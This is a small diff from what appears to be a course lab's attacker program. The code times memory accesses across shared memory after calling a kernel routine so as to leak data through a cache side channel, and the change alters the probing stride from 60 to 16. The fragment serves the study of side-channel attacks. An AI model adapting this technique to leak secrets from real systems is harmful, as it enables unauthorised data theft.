@@ -68,7 +68,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         call_kernel_part1(kernel_fd, shared_memory, current_offset);
 
         //Reload and measure time and Decode the transmission to get data
-        for (flush_offset = 0; flush_offset <  LAB2_SHARED_MEMORY_SIZE; flush_offset += 60) {
+        for (flush_offset = 0; flush_offset <  LAB2_SHARED_MEMORY_SIZE; flush_offset += 16) {
             dram_latency = time_access((void*)(shared_memory+flush_offset));
             printf("\n This is the char we leaked %li", dram_latency);
             if (dram_latency < 100){
